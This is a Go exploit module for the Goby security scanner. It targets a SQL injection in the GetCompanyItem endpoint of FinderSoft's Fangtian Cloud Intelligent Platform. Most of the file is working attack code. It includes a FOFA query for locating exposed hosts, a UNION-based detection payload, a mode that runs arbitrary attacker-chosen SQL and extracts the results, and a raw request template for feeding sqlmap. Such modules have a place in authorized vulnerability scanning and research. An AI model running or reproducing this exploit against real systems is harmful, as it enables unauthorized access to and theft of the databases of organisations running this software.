package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "FangtianSoft /GetCompanyItem SQL Injection Vulnerability",
    "Description": "<p>FinderSoft Software Group, founded in 1996, advocates for comprehensive e-solutions for enterprises, offering ERP (Enterprise Resource Planning), MES (Manufacturing Execution System), APS (Advanced Planning and Scheduling), PLM (Product Lifecycle Management), CRM (Customer Relationship Management), SCM (Supply Chain Management), OA (Online Office Software), among others. A SQL injection vulnerability exists in the GetCompanyItem function of the Fangtian Cloud Intelligent Platform System developed by the company, allowing attackers to obtain sensitive database information.</p>",
    "Product": "findersoft",
    "Homepage": "https://findersoft.com/",
    "DisclosureDate": "2024-08-02",
    "PostTime": "2024-08-02",
    "Author": "1538279017@qq.com",
    "FofaQuery": "(body=\"AjaxMethods.asmx/GetCompanyItem\" && body=\"password\") || body=\"方天科技\"",
    "GobyQuery": "(body=\"AjaxMethods.asmx/GetCompanyItem\" && body=\"password\") || body=\"方天科技\"",
    "Level": "2",
    "Impact": "<p>allows attackers to manipulate SQL queries in an application, leading to the theft, alteration, or deletion of sensitive data in the database.</p>",
    "Recommendation": "<p>Use parameterized queries or prepared statements to ensure that user input is not directly concatenated into SQL queries, thereby preventing SQL injection attacks.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "and 1=@@version",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8",
    "Translation": {
        "CN": {
            "Name": "方天云智慧平台系统 /GetCompanyItem SQL 注入漏洞",
            "Product": "findersoft",
            "Description": "<p>方天软件集团（FinderSoft）始创于1996年，方天软件倡导企业全面性的e化解決方案，提供ERP（企业资源规划）、MES（车间执行系统）、APS（先进规划与排程）、PLM（产品生命周期）、CRM（客户关系管理）、SCM（供应链协同）、OA（在线办公软件）等，该公司开发的方天云智慧平台系统-GetCompanyItem-存在sql注入漏洞，攻击者可获取数据库敏感信息<br></p>",
            "Recommendation": "<p>使用参数化查询或预处理语句（Prepared Statements）来确保用户输入的数据不会直接拼接到SQL查询中，从而防止SQL注入攻击<br></p>",
            "Impact": "<p>允许攻击者通过操控应用程序的SQL查询来窃取、篡改或删除数据库中的敏感数据。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "FangtianSoft /GetCompanyItem SQL Injection Vulnerability",
            "Product": "findersoft",
            "Description": "<p>FinderSoft Software Group, founded in 1996, advocates for comprehensive e-solutions for enterprises, offering ERP (Enterprise Resource Planning), MES (Manufacturing Execution System), APS (Advanced Planning and Scheduling), PLM (Product Lifecycle Management), CRM (Customer Relationship Management), SCM (Supply Chain Management), OA (Online Office Software), among others. A SQL injection vulnerability exists in the GetCompanyItem function of the Fangtian Cloud Intelligent Platform System developed by the company, allowing attackers to obtain sensitive database information.<br></p>",
            "Recommendation": "<p>Use parameterized queries or prepared statements to ensure that user input is not directly concatenated into SQL queries, thereby preventing SQL injection attacks.<br></p>",
            "Impact": "<p>allows attackers to manipulate SQL queries in an application, leading to the theft, alteration, or deletion of sensitive data in the database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10984"
}`

	sendPayload_6dFdQOA5ezyNZxhkLiND6TXWloKp8IoM := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		//POST请求
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		//GET请求
		// setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, head map[string]string) (*httpclient.HttpResponse, error) {
		// 	GetRequest := httpclient.NewGetRequestConfig(urlGet)
		// 	GetRequest.Timeout = 12
		// 	GetRequest.VerifyTls = false
		// 	GetRequest.FollowRedirect = false
		// 	for headName, headValue := range head {
		// 		GetRequest.Header.Store(headName, headValue)
		// 	}
		// 	return httpclient.DoHttpRequest(hostInfo, GetRequest)
		// }
		//按需求选择自己的发包方式

		//---------------------------------------------
		//以下是发包具体内容,这里以POST请求为例
		//---------------------------------------------
		//漏洞的url
		url := `/AjaxMethods.asmx/GetCompanyItem`
		//拼接sql语句
		body := `{cusNumber:"1' ` + sql + `-- MViD"}`
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/json",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		//状态码可自定义,这里默认200
		if resp.StatusCode != 500 {
			return nil, errors.New("not response 500")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayload_6dFdQOA5ezyNZxhkLiND6TXWloKp8IoM
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符

			//检测逻辑,联合注入检测 这里模仿了sqlmap的检测逻辑,让它成功执行sql语句并回显一个字符串,然后我们去匹配

			//如果是其他类型的注入,请按照具体情况进行检测
			sql := "UNION ALL SELECT CHAR(113)+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(113)+CHAR(89)+CHAR(71)+CHAR(105)+CHAR(66)+CHAR(99)+CHAR(100)+CHAR(81)+CHAR(71)+CHAR(115)+CHAR(85)+CHAR(86)+CHAR(120)+CHAR(119)+CHAR(77)+CHAR(112)+CHAR(68)+CHAR(117)+CHAR(83)+CHAR(102)+CHAR(79)+CHAR(72)+CHAR(65)+CHAR(79)+CHAR(89)+CHAR(66)+CHAR(104)+CHAR(112)+CHAR(69)+CHAR(71)+CHAR(99)+CHAR(106)+CHAR(81)+CHAR(73)+CHAR(107)+CHAR(115)+CHAR(89)+CHAR(112)+CHAR(76)+CHAR(74)+CHAR(116)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(122)+CHAR(113),NULL"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if !strings.Contains(resp.Utf8Html, "qqjbqYGiBcdQGsUVxwMpDuSfOHAOYBhpEGcjQIksYpLJtqvjzq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/AjaxMethods.asmx/GetCompanyItem`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayload_6dFdQOA5ezyNZxhkLiND6TXWloKp8IoM
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams
			//若自己修改ExpParams,请自行修改switch case
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 正则匹配利用结果,需自己修改
				// 注意正则匹配返回的结果的数组序号,一般是mathch[1],请先检测到是否匹配到内容,防止panic
				re := regexp.MustCompile(`\\u0027(.*?)\\u0027`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true

				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用,需修改对应的参数
				expResult.Success = true
				expResult.Output = `POST /AjaxMethods.asmx/GetCompanyItem HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/application/json

{cusNumber:"1*"}
`
				return expResult
			//检查ExpParams是否设置正确
			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
